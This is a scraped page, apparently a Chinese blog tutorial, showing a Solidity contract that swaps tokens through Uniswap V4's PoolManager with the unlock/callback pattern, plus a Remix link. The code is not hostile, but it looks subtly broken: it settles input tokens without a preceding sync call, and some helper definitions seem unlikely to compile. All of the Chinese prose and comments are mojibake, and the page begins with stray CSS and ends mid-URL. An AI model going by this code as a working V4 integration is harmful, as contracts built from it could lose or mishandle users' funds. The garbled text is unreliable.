                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>æ¬¢è¿è®¢é˜…ä¸“æ </strong>ï¼š<a href="https://juejin.cn/column/7578762210285977663" title="https://juejin.cn/column/7578762210285977663" target="_blank">3åˆ†é’ŸSolidity--æ™ºèƒ½åˆçº¦--Web3åŒºå—é“¾æŠ€æœ¯å¿…å­¦</a></p>
<h2 data-id="heading-0">Uniswap V4 å…‘æ¢</h2>
<p>Uniswap V4 å¼•å…¥äº†å•ä¸€å®ä¾‹Â <code>PoolManager</code>ï¼Œå°†æ‰€æœ‰æµåŠ¨æ€§æ± é›†ä¸­åœ¨ä¸€ä¸ªæ™ºèƒ½åˆçº¦ä¸­ç®¡ç†ã€‚</p>
<p>V3ç‰ˆæœ¬çš„ä¸»è¦åŒºåˆ«ï¼š</p>
<ul>
<li><strong>å•ä¾‹æ¶æ„</strong>â€‹ - æ‰€æœ‰èµ„é‡‘æ± éƒ½å­˜åœ¨äºä¸€ä¸ªåˆçº¦ä¸­</li>
<li><strong>é—ªå­˜è®°è´¦</strong>â€‹ - ä»£å¸è½¬ç§»ä»…åœ¨æœ€åé˜¶æ®µå‘ç”Ÿï¼Œé™ä½Gasè´¹ç”¨</li>
<li><strong>è§£é”/å›è°ƒæ¨¡å¼</strong>â€‹ - é€šè¿‡å›è°ƒæœºåˆ¶è¿›è¡Œäº¤äº’</li>
</ul>
<p>è¦å…‘æ¢ï¼š</p>
<ol>
<li>è°ƒç”¨å¸¦æœ‰ç¼–ç å‚æ•°çš„<code>poolManager.unlock()</code></li>
<li>PoolManagerä¼šè°ƒç”¨ä½ çš„<code>unlockCallback()</code></li>
<li>åœ¨å›è°ƒå‡½æ•°ä¸­ï¼šæ‰§è¡Œäº¤æ¢ã€ç»“ç®—è¾“å…¥ã€è·å–è¾“å‡º</li>
<li>åœ¨è§£é”å®Œæˆå‰ï¼Œå·®é¢å¿…é¡»å‡€å€¼ä¸ºé›¶</li>
</ol>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-selector-class">.26</span>;

<span class="hljs-comment">// ä»¥å¤ªåŠä¸»ç½‘ä¸Šçš„Uniswap V4 PoolManager</span>
<span class="hljs-selector-tag">address</span> constant POOL_MANAGER = <span class="hljs-number">0</span>x000000000004444c5dc75cB358380D2e3dE08A90;
<span class="hljs-selector-tag">address</span> constant WETH = <span class="hljs-number">0</span>xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
<span class="hljs-selector-tag">address</span> constant USDC = <span class="hljs-number">0</span>xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

<span class="hljs-comment">/// @notice ç›´æ¥åœ¨Uniswap V4ä¸Šä½¿ç”¨PoolManagerè¿›è¡Œäº¤æ¢çš„ç¤ºä¾‹</span>
<span class="hljs-comment">/// @dev V4 ä½¿ç”¨å•ä¾‹PoolManagerå¹¶é‡‡ç”¨unlock/unlockCallbackæ¨¡å¼</span>
contract UniswapV4Swap is IUnlockCallback {
    IPoolManager public immutable poolManager;

    error <span class="hljs-built_in">NotPoolManager</span>();
    error <span class="hljs-built_in">SwapFailed</span>();

    <span class="hljs-built_in">constructor</span>() {
        poolManager = <span class="hljs-built_in">IPoolManager</span>(POOL_MANAGER);
    }

    <span class="hljs-comment">/// @notice å°†è¾“å…¥çš„ç²¾ç¡®é‡‘é¢å…‘æ¢ä¸ºè¾“å‡ºä»£å¸</span>
    <span class="hljs-comment">/// @param key æ ‡è¯†æ± çš„æ± å¯†é’¥</span>
    <span class="hljs-comment">/// @param amountIn è¾“å…¥ä»£å¸çš„äº¤æ¢æ•°é‡</span>
    <span class="hljs-comment">/// @param minAmountOut æœ€ä½å¯æ¥å—è¾“å‡ºé‡</span>
    function <span class="hljs-built_in">swapExactInput</span>(
        PoolKey calldata key,
        uint128 amountIn,
        uint128 minAmountOut
    ) external returns (uint256 amountOut) {
        <span class="hljs-comment">// Encode swap parameters to pass through unlock callback</span>
        bytes memory data = abi<span class="hljs-selector-class">.encode</span>(
            SwapParams({
                key: key,
                amountIn: amountIn,
                minAmountOut: minAmountOut,
                zeroForOne: true,
                sender: msg.sender
            })
        );

        <span class="hljs-comment">// å‘èµ·äº¤æ¢ - PoolManagerå°†è°ƒç”¨unlockCallback</span>
        bytes memory result = poolManager<span class="hljs-selector-class">.unlock</span>(data);
        amountOut = abi<span class="hljs-selector-class">.decode</span>(result, (uint256));
    }

    <span class="hljs-comment">/// @notice PoolManagerè§£é”åçš„å›è°ƒ</span>
    <span class="hljs-comment">/// @dev è¿™é‡Œæ˜¯å®é™…æ‰§è¡Œäº¤æ¢é€»è¾‘çš„åœ°æ–¹</span>
    function <span class="hljs-built_in">unlockCallback</span>(bytes calldata data)
        external
        override
        returns (bytes memory)
    {
        if (msg.sender != address(poolManager)) revert <span class="hljs-built_in">NotPoolManager</span>();

        SwapParams memory params = abi<span class="hljs-selector-class">.decode</span>(data, (SwapParams));

        <span class="hljs-comment">// æ‰§è¡Œäº¤æ¢</span>
        <span class="hljs-comment">// zeroForOne: true = token0 -&gt; token1, false = token1 -&gt; token0</span>
        <span class="hljs-comment">// amountSpecified: negative = exact input, positive = exact output</span>
        BalanceDelta delta = poolManager<span class="hljs-selector-class">.swap</span>(
            params.key,
            IPoolManager.SwapParams({
                zeroForOne: params.zeroForOne,
                amountSpecified: -int256(uint256(params.amountIn)),
                sqrtPriceLimitX96: params.zeroForOne
                    ? MIN_SQRT_PRICE + <span class="hljs-number">1</span>
                    : MAX_SQRT_PRICE - <span class="hljs-number">1</span>
            }),
            <span class="hljs-built_in">bytes</span>("")
        );

        <span class="hljs-comment">// æ ¹æ®å·®å€¼è®¡ç®—é‡‘é¢</span>
        <span class="hljs-comment">// delta.amount0() is negative (we owe the pool)</span>
        <span class="hljs-comment">// delta.amount1() is positive (pool owes us)</span>
        uint256 amountOut = params<span class="hljs-selector-class">.zeroForOne</span>
            ? <span class="hljs-built_in">uint256</span>(int256(delta.amount1()))
            : <span class="hljs-built_in">uint256</span>(<span class="hljs-built_in">int256</span>(delta.<span class="hljs-built_in">amount0</span>()));

        if (amountOut &lt; params.minAmountOut) revert <span class="hljs-built_in">SwapFailed</span>();

        <span class="hljs-comment">// ç»“ç®—è¾“å…¥ä»£å¸ï¼ˆæ”¯ä»˜æˆ‘ä»¬æ‰€æ¬ æ¬¾é¡¹ï¼‰</span>
        Currency inputCurrency = params<span class="hljs-selector-class">.zeroForOne</span>
            ? params<span class="hljs-selector-class">.key</span><span class="hljs-selector-class">.currency0</span>
            : params.key.currency1;

        <span class="hljs-built_in">IERC20</span>(Currency.unwrap(inputCurrency))<span class="hljs-selector-class">.transferFrom</span>(
            params.sender,
            address(poolManager),
            params<span class="hljs-selector-class">.amountIn</span>
        );
        poolManager<span class="hljs-selector-class">.settle</span>(inputCurrency);

        <span class="hljs-comment">// Take the output token (receive what we're owed)</span>
        Currency outputCurrency = params<span class="hljs-selector-class">.zeroForOne</span>
            ? params<span class="hljs-selector-class">.key</span><span class="hljs-selector-class">.currency1</span>
            : params.key.currency0;

        poolManager<span class="hljs-selector-class">.take</span>(outputCurrency, params.sender, amountOut);

        return abi<span class="hljs-selector-class">.encode</span>(amountOut);
    }

    struct SwapParams {
        PoolKey key;
        uint128 amountIn;
        uint128 minAmountOut;
        bool zeroForOne;
        <span class="hljs-selector-tag">address</span> sender;
    }
}

<span class="hljs-comment">// äº¤æ¢çš„å¹³æ–¹æ ¹ä»·æ ¼é™åˆ¶</span>
uint160 constant MIN_SQRT_PRICE = <span class="hljs-number">4295128739</span>;
uint160 constant MAX_SQRT_PRICE =
    <span class="hljs-number">1461446703485210103287273052203988822378723970342</span>;

<span class="hljs-comment">// è´§å¸æ˜¯ä¸€ä¸ªåœ°å€åŒ…è£…å™¨ï¼ˆaddress(0) = åŸç”ŸETHï¼‰</span>
type Currency is <span class="hljs-selector-tag">address</span>;

library CurrencyLibrary {
    function <span class="hljs-built_in">unwrap</span>(Currency currency) internal pure returns (address) {
        return Currency<span class="hljs-selector-class">.unwrap</span>(currency);
    }
}

using CurrencyLibrary for Currency;

struct PoolKey {
    Currency currency0;
    Currency currency1;
    uint24 fee;
    int24 tickSpacing;
    <span class="hljs-selector-tag">address</span> hooks;
}

<span class="hljs-comment">/// @notice äº¤æ¢æ“ä½œè¿”å›çš„ä½™é¢å·®é¢</span>
<span class="hljs-comment">/// @dev è´Ÿ = ä½ æ¬ æ± å­ï¼Œæ­£ = æ± å­æ¬ ä½ </span>
type BalanceDelta is int256;

library BalanceDeltaLibrary {
    function <span class="hljs-built_in">amount0</span>(BalanceDelta delta) internal pure returns (int128) {
        return <span class="hljs-built_in">int128</span>(int256(BalanceDelta.unwrap(delta) &gt;&gt; <span class="hljs-number">128</span>));
    }

    function <span class="hljs-built_in">amount1</span>(BalanceDelta delta) internal pure returns (int128) {
        return <span class="hljs-built_in">int128</span>(int256(BalanceDelta.unwrap(delta)));
    }
}

using BalanceDeltaLibrary for BalanceDelta;

interface IPoolManager {
    struct SwapParams {
        bool zeroForOne;
        int256 amountSpecified;
        uint160 sqrtPriceLimitX96;
    }

    function <span class="hljs-built_in">unlock</span>(bytes calldata data) external returns (bytes memory);
    function <span class="hljs-built_in">swap</span>(PoolKey memory key, SwapParams memory params, bytes calldata hookData)
        external
        returns (BalanceDelta);
    function <span class="hljs-built_in">settle</span>(Currency currency) external payable returns (uint256);
    function <span class="hljs-built_in">take</span>(Currency currency, address to, uint256 amount) external;
}

interface IUnlockCallback {
    function <span class="hljs-built_in">unlockCallback</span>(bytes calldata data) external returns (bytes memory);
}

interface IERC20 {
    function <span class="hljs-built_in">transferFrom</span>(address sender, address recipient, uint256 amount)
        external
        returns (bool);
    function <span class="hljs-built_in">approve</span>(address spender, uint256 amount) external returns (bool);
}
</code></pre>
<h3 data-id="heading-1">Try on Remix</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fremix.ethereum.org%2F%3F%23code%3DLy8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCi8vIFVuaXN3YXAgVjQgUG9vbE1hbmFnZXIgb24gRXRoZXJldW0gbWFpbm5ldAphZGRyZXNzIGNvbnN0YW50IFBPT0xfTUFOQUdFUiA9IDB4MDAwMDAwMDAwMDA0NDQ0YzVkYzc1Y0IzNTgzODBEMmUzZEUwOEE5MDsKYWRkcmVzcyBjb25zdGFudCBXRVRIID0gMHhDMDJhYUEzOWIyMjNGRThEMEEwZTVDNEYyN2VBRDkwODNDNzU2Q2MyOwphZGRyZXNzIGNvbnN0YW50IFVTREMgPSAweEEwYjg2OTkxYzYyMThiMzZjMWQxOUQ0YTJlOUViMGNFMzYwNmVCNDg7CgovLy8gQG5vdGljZSBFeGFtcGxlIG9mIHN3YXBwaW5nIG9uIFVuaXN3YXAgVjQgdXNpbmcgdGhlIFBvb2xNYW5hZ2VyIGRpcmVjdGx5Ci8vLyBAZGV2IFY0IHVzZXMgYSBzaW5nbGV0b24gUG9vbE1hbmFnZXIgd2l0aCB1bmxvY2svdW5sb2NrQ2FsbGJhY2sgcGF0dGVybgpjb250cmFjdCBVbmlzd2FwVjRTd2FwIGlzIElVbmxvY2tDYWxsYmFjayB7CiAgICBJUG9vbE1hbmFnZXIgcHVibGljIGltbXV0YWJsZSBwb29sTWFuYWdlcjsKCiAgICBlcnJvciBOb3RQb29sTWFuYWdlcigpOwogICAgZXJyb3IgU3dhcEZhaWxlZCgpOwoKICAgIGNvbnN0cnVjdG9yKCkgewogICAgICAgIHBvb2xNYW5hZ2VyID0gSVBvb2xNYW5hZ2VyKFBPT0xfTUFOQUdFUik7CiAgICB9CgogICAgLy8vIEBub3RpY2UgU3dhcCBleGFjdCBpbnB1dCBhbW91bnQgZm9yIG91dHB1dCB0b2tlbnMKICAgIC8vLyBAcGFyYW0ga2V5IFRoZSBwb29sIGtleSBpZGVudGlmeWluZyB0aGUgcG9vbAogICAgLy8vIEBwYXJhbSBhbW91bnRJbiBBbW91bnQgb2YgaW5wdXQgdG9rZW5zIHRvIHN3YXAKICAgIC8vLyBAcGFyYW0gbWluQW1vdW50T3V0IE1pbmltdW0gYWNjZXB0YWJsZSBvdXRwdXQgYW1vdW50CiAgICBmdW5jdGlvbiBzd2FwRXhhY3RJbnB1dCgKICAgICAgICBQb29sS2V5IGNhbGxkYXRhIGtleSwKICAgICAgICB1aW50MTI4IGFtb3VudEluLAogICAgICAgIHVpbnQxMjggbWluQW1vdW50T3V0CiAgICApIGV4dGVybmFsIHJldHVybnMgKHVpbnQyNTYgYW1vdW50T3V0KSB7CiAgICAgICAgLy8gRW5jb2RlIHN3YXAgcGFyYW1ldGVycyB0byBwYXNzIHRocm91Z2ggdW5sb2NrIGNhbGxiYWNrCiAgICAgICAgYnl0ZXMgbWVtb3J5IGRhdGEgPSBhYmkuZW5jb2RlKAogICAgICAgICAgICBTd2FwUGFyYW1zKHsKICAgICAgICAgICAgICAgIGtleToga2V5LAogICAgICAgICAgICAgICAgYW1vdW50SW46IGFtb3VudEluLAogICAgICAgICAgICAgICAgbWluQW1vdW50T3V0OiBtaW5BbW91bnRPdXQsCiAgICAgICAgICAgICAgICB6ZXJvRm9yT25lOiB0cnVlLAogICAgICAgICAgICAgICAgc2VuZGVyOiBtc2cuc2VuZGVyCiAgICAgICAgICAgIH0pCiAgICAgICAgKTsKCiAgICAgICAgLy8gSW5pdGlhdGUgdGhlIHN3YXAgLSBQb29sTWFuYWdlciB3aWxsIGNhbGwgdW5sb2NrQ2FsbGJhY2sKICAgICAgICBieXRlcyBtZW1vcnkgcmVzdWx0ID0gcG9vbE1hbmFnZXIudW5sb2NrKGRhdGEpOwogICAgICAgIGFtb3VudE91dCA9IGFiaS5kZWNvZGUocmVzdWx0LCAodWludDI1NikpOwogICAgfQoKICAgIC8vLyBAbm90aWNlIENhbGxiYWNrIGZyb20gUG9vbE1hbmFnZXIgYWZ0ZXIgdW5sb2NrCiAgICAvLy8gQGRldiBUaGlzIGlzIHdoZXJlIHRoZSBhY3R1YWwgc3dhcCBsb2dpYyBleGVjdXRlcwogICAgZnVuY3Rpb24gdW5sb2NrQ2FsbGJhY2soYnl0ZXMgY2FsbGRhdGEgZGF0YSkKICAgICAgICBleHRlcm5hbAogICAgICAgIG92ZXJyaWRlCiAgICAgICAgcmV0dXJucyAoYnl0ZXMgbWVtb3J5KQogICAgewogICAgICAgIGlmIChtc2cuc2VuZGVyICE9IGFkZHJlc3MocG9vbE1hbmFnZXIpKSByZXZlcnQgTm90UG9vbE1hbmFnZXIoKTsKCiAgICAgICAgU3dhcFBhcmFtcyBtZW1vcnkgcGFyYW1zID0gYWJpLmRlY29kZShkYXRhLCAoU3dhcFBhcmFtcykpOwoKICAgICAgICAvLyBFeGVjdXRlIHRoZSBzd2FwCiAgICAgICAgLy8gemVyb0Zvck9uZTogdHJ1ZSA9IHRva2VuMCAtPiB0b2tlbjEsIGZhbHNlID0gdG9rZW4xIC0%2BIHRva2VuMAogICAgICAgIC8vIGFtb3VudFNwZWNpZmllZDogbmVnYXRpdmUgPSBleGFjdCBpbnB1dCwgcG9zaXRpdmUgPSBleGFjdCBvdXRwdXQKICAgICAgICBCYWxhbmNlRGVsdGEgZGVsdGEgPSBwb29sTWFuYWdlci5zd2FwKAogICAgICAgICAgICBwYXJhbXMua2V5LAogICAgICAgICAgICBJUG9vbE1hbmFnZXIuU3dhcFBhcmFtcyh7CiAgICAgICAgICAgICAgICB6ZXJvRm9yT25lOiBwYXJhbXMuemVyb0Zvck9uZSwKICAgICAgICAgICAgICAgIGFtb3VudFNwZWNpZmllZDogLWludDI1Nih1aW50MjU2KHBhcmFtcy5hbW91bnRJbikpLAogICAgICAgICAgICAgICAgc3FydFByaWNlTGltaXRYOTY6IHBhcmFtcy56ZXJvRm9yT25lCiAgICAgICAgICAgICAgICAgICAgPyBNSU5fU1FSVF9QUklDRSArIDEKICAgICAgICAgICAgICAgICAgICA6IE1BWF9TUVJUX1BSSUNFIC0gMQogICAgICAgICAgICB9KSwKICAgICAgICAgICAgYnl0ZXMoIiIpCiAgICAgICAgKTsKCiAgICAgICAgLy8gQ2FsY3VsYXRlIGFtb3VudHMgZnJvbSBkZWx0YQogICAgICAgIC8vIGRlbHRhLmFtb3VudDAoKSBpcyBuZWdhdGl2ZSAod2Ugb3dlIHRoZSBwb29sKQogICAgICAgIC8vIGRlbHRhLmFtb3VudDEoKSBpcyBwb3NpdGl2ZSAocG9vbCBvd2VzIHVzKQogICAgICAgIHVpbnQyNTYgYW1vdW50T3V0ID0gcGFyYW1zLnplcm9Gb3JPbmUKICAgICAgICAgICAgPyB1aW50MjU2KGludDI1NihkZWx0YS5hbW91bnQxKCkpKQogICAgICAgICAgICA6IHVpbnQyNTYoaW50MjU2KGRlbHRhLmFtb3VudDAoKSkpOwoKICAgICAgICBpZiAoYW1vdW50T3V0IDwgcGFyYW1zLm1pbkFtb3VudE91dCkgcmV2ZXJ0IFN3YXBGYWlsZWQoKTsKCiAgICAgICAgLy8gU2V0dGxlIHRoZSBpbnB1dCB0b2tlbiAocGF5IHdoYXQgd2Ugb3dlKQogICAgICAgIEN1cnJlbmN5IGlucHV0Q3VycmVuY3kgPSBwYXJhbXMuemVyb0Zvck9uZQogICAgICAgICAgICA%2FIHBhcmFtcy5rZXkuY3VycmVuY3kwCiAgICAgICAgICAgIDogcGFyYW1zLmtleS5jdXJyZW5jeTE7CgogICAgICAgIElFUkMyMChDdXJyZW5jeS51bndyYXAoaW5wdXRDdXJyZW5jeSkpLnRyYW5zZmVyRnJvbSgKICAgICAgICAgICAgcGFyYW1zLnNlbmRlciwKICAgICAgICAgICAgYWRkcmVzcyhwb29sTWFuYWdlciksCiAgICAgICAgICAgIHBhcmFtcy5hbW91bnRJbgogICAgICAgICk7CiAgICAgICAgcG9vbE1hbmFnZXIuc2V0dGxlKGlucHV0Q3VycmVuY3kpOwoKICAgICAgICAvLyBUYWtlIHRoZSBvdXRwdXQgdG9rZW4gKHJlY2VpdmUgd2hhdCB3ZSdyZSBvd2VkKQogICAgICAgIEN1cnJlbmN5IG91dHB1dEN1cnJlbmN5ID0gcGFyYW1zLnplcm9Gb3JPbmUKICAgICAgICAgICAgPyBwYXJhbXMua2V5LmN1cnJlbmN5MQogICAgICAgICAgICA6IHBhcmFtcy5rZXkuY3VycmVuY3kwOwoKICAgICAgICBwb29sTWFuYWdlci50YWtlKG91dHB1dEN1cnJlbmN5LCBwYXJhbXMuc2VuZGVyLCBhbW91bnRPdXQpOwoKICAgICAgICByZXR1cm4gYWJpLmVuY29kZShhbW91bnRPdXQpOwogICAgfQoKICAgIHN0cnVjdCBTd2FwUGFyYW1zIHsKICAgICAgICBQb29sS2V5IGtleTsKICAgICAgICB1aW50MTI4IGFtb3VudEluOwogICAgICAgIHVpbnQxMjggbWluQW1vdW50T3V0OwogICAgICAgIGJvb2wgemVyb0Zvck9uZTsKICAgICAgICBhZGRyZXNzIHNlbmRlcjsKICAgIH0KfQoKLy8gU3FydCBwcmljZSBsaW1pdHMgZm9yIHN3YXBzCnVpbnQxNjAgY29uc3RhbnQgTUlOX1NRUlRfUFJJQ0UgPSA0Mjk1MTI4NzM5Owp1aW50MTYwIGNvbnN0YW50IE1BWF9TUVJUX1BSSUNFID0KICAgIDE0NjE0NDY3MDM0ODUyMTAxMDMyODcyNzMwNTIyMDM5ODg4MjIzNzg3MjM5NzAzNDI7CgovLyBDdXJyZW5jeSBpcyBhbiBhZGRyZXNzIHdyYXBwZXIgKGFkZHJlc3MoMCkgPSBuYXRpdmUgRVRIKQp0eXBlIEN1cnJlbmN5IGlzIGFkZHJlc3M7CgpsaWJyYXJ5IEN1cnJlbmN5TGlicmFyeSB7CiAgICBmdW5jdGlvbiB1bndyYXAoQ3VycmVuY3kgY3VycmVuY3kpIGludGVybmFsIHB1cmUgcmV0dXJucyAoYWRkcmVzcykgewogICAgICAgIHJldHVybiBDdXJyZW5jeS51bndyYXAoY3VycmVuY3kpOwogICAgfQp9Cgp1c2luZyBDdXJyZW5jeUxpYnJhcnkgZm9yIEN1cnJlbmN5OwoKc3RydWN0IFBvb2xLZXkgewogICAgQ3VycmVuY3kgY3VycmVuY3kwOwogICAgQ3VycmVuY3kgY3VycmVuY3kxOwogICAgdWludDI0IGZlZTsKICAgIGludDI0IHRpY2tTcGFjaW5nOwogICAgYWRkcmVzcyBob29rczsKfQoKLy8vIEBub3RpY2UgQmFsYW5jZSBkZWx0YSByZXR1cm5lZCBmcm9tIHN3YXAgb3BlcmF0aW9ucwovLy8gQGRldiBOZWdhdGl2ZSA9IHlvdSBvd2UgdGhlIHBvb2wsIFBvc2l0aXZlID0gcG9vbCBvd2VzIHlvdQp0eXBlIEJhbGFuY2VEZWx0YSBpcyBpbnQyNTY7CgpsaWJyYXJ5IEJhbGFuY2VEZWx0YUxpYnJhcnkgewogICAgZnVuY3Rpb24gYW1vdW50MChCYWxhbmNlRGVsdGEgZGVsdGEpIGludGVybmFsIHB1cmUgcmV0dXJucyAoaW50MTI4KSB7CiAgICAgICAgcmV0dXJuIGludDEyOChpbnQyNTYoQmFsYW5jZURlbHRhLnVud3JhcChkZWx0YSkgPj4gMTI4KSk7CiAgICB9CgogICAgZnVuY3Rpb24gYW1vdW50MShCYWxhbmNlRGVsdGEgZGVsdGEpIGludGVybmFsIHB1cmUgcmV0dXJucyAoaW50MTI4KSB7CiAgICAgICAgcmV0dXJuIGludDEyOChpbnQyNTYoQmFsYW5jZURlbHRhLnVud3JhcChkZWx0YSkpKTsKICAgIH0KfQoKdXNpbmcgQmFsYW5jZURlbHRhTGlicmFyeSBmb3IgQmFsYW5jZURlbHRhOwoKaW50ZXJmYWNlIElQb29sTWFuYWdlciB7CiAgICBzdHJ1Y3QgU3dhcFBhcmFtcyB7CiAgICAgICAgYm9vbCB6ZXJvRm9yT25lOwogICAgICAgIGludDI1NiBhbW91bnRTcGVjaWZpZWQ7CiAgICAgICAgdWludDE2MCBzcXJ0UHJpY2VMaW1pdFg5NjsKICAgIH0KCiAgICBmdW5jdGlvbiB1bmxvY2soYnl0ZXMgY2FsbGRhdGEgZGF0YSkgZXh0ZXJuYWwgcmV0dXJucyAoYnl0ZXMgbWVtb3J5KTsKICAgIGZ1bmN0aW9uIHN3YXAoUG9vbEtleSBtZW1vcnkga2V5LCBTd2FwUGFyYW1zIG1lbW9yeSBwYXJhbXMsIGJ5dGVzIGNhbGxkYXRhIGhvb2tEYXRhKQogICAgICAgIGV4dGVybmFsCiAgICAgICAgcmV0dXJucyAoQmFsYW5jZURlbHRhKTsKICAgIGZ1bmN0aW9uIHNldHRsZShDdXJyZW5jeSBjdXJyZW5jeSkgZXh0ZXJuYWwgcGF5YWJsZSByZXR1cm5zICh1aW50MjU2KTsKICAgIGZ1bmN0aW9uIHRha2UoQ3VycmVuY3kgY3VycmVuY3ksIGFkZHJlc3MgdG8sIHVpbnQyNTYgYW1vdW50KSBleHRlcm5hbDsKfQoKaW50ZXJmYWNlIElVbmxvY2tDYWxsYmFjayB7CiAgICBmdW5jdGlvbiB1bmxvY2tDYWxsYmFjayhieXRlcyBjYWxsZGF0YSBkYXRhKSBleHRlcm5hbCByZXR1cm5zIChieXRlcyBtZW1vcnkpOwp9CgppbnRlcmZhY2UgSUVSQzIwIHsKICAgIGZ1bmN0aW9uIHRyYW5zZmVyRnJvbShhZGRyZXNzIHNlbmRlciwgYWRkcmVzcyByZWNpcGllbnQsIHVpbnQyNTYgYW1vdW50KQogICAgICAgIGV4dGVybmFsCiAgICAgICAgcmV0dXJucyAoYm9vbCk7CiAgICBmdW5jdGlvbiBhcHByb3ZlKGFkZHJlc3Mgc3BlbmRlciwgdWludDI1NiBhbW91bnQpIGV4dGVybmFsIHJldHVybnMgKGJvb2wpOwp9Cg%3D%3D" target="_blank" title="https://remix.ethereum.org/?#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCi8vIFVuaXN3YXAgVjQgUG9vbE1hbmFnZXIgb24gRXRoZXJldW0gbWFpbm5ldAphZGRyZXNzIGNvbnN0YW50IFBPT0xfTUFOQUdFUiA9IDB4MDAwMDAwMDAwMDA0NDQ0YzVkYzc1Y0IzNTgzODBEMmUzZEUwOEE5MDsKYWRkcmVzcyBjb25zdGFudCBXRVRIID0gMHhDMDJhYUEzOWIyMjNGRThEMEEwZTVDNEYyN2VBRDkwODNDNzU2Q2MyOwphZGRyZXNzIGNvbnN0YW50IFVTREMgPSAweEEwYjg2OTkxYzYyMThiMzZjMWQxOUQ0YTJlOUViMGNFMzYwNmVCNDg7CgovLy8gQG5vdGljZSBFeGFtcGxlIG9mIHN3YXBwaW5nIG9uIFVuaXN3YXAgVjQgdXNpbmcgdGhlIFBvb2xNYW5hZ2VyIGRpcmVjdGx5Ci8vLyBAZGV2IFY0IHVzZXMgYSBzaW5nbGV0b24gUG9vbE1hbmFnZXIgd2l0aCB1bmxvY2svdW5sb2NrQ2FsbGJhY2sgcGF0dGVybgpjb250cmFjdCBVbmlzd2FwVjRTd2FwIGlzIElVbmxvY2tDYWxsYmFjayB7CiAgICBJUG9vbE1hbmFnZXIgcHVibGljIGltbXV0YWJsZSBwb29sTWFuYWdlcjsKCiAgICBlcnJvciBOb3RQb29sTWFuYWdlcigpOwogICAgZXJyb3IgU3dhcEZhaWxlZCgpOwoKICAgIGNvbnN0cnVjdG9yKCkgewogICAgICAgIHBvb2xNYW5hZ2VyID0gSVBvb2xNYW5hZ2VyKFBPT0xfTUFOQUdFUik7CiAgICB9CgogICAgLy8vIEBub3RpY2UgU3dhcCBleGFjdCBpbnB1dCBhbW91bnQgZm9yIG91dHB1dCB0b2tlbnMKICAgIC8vLyBAcGFyYW0ga2V5IFRoZSBwb29sIGtleSBpZGVudG